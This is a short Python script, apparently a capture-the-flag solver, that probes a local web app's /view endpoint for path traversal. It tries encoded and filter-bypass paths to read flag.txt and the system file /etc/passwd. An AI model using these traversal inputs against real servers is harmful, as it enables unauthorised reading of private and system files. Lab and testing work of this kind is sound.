import requests

BASE = "http://localhost:5000"

def try_read(path):
    r = requests.get(f"{BASE}/view", params={"file": path}, timeout=5)
    print(f"=== {path} ===")
    print(r.text[:1000])
    print()

if __name__ == "__main__":
    try_read("flag.txt")
    try_read("/flag.txt")
    try_read("....//app/flag.txt")
    try_read("%2e%2e%2fapp%2fflag.txt")
    try_read("/app/flag.txt")
    try_read("/etc/passwd")
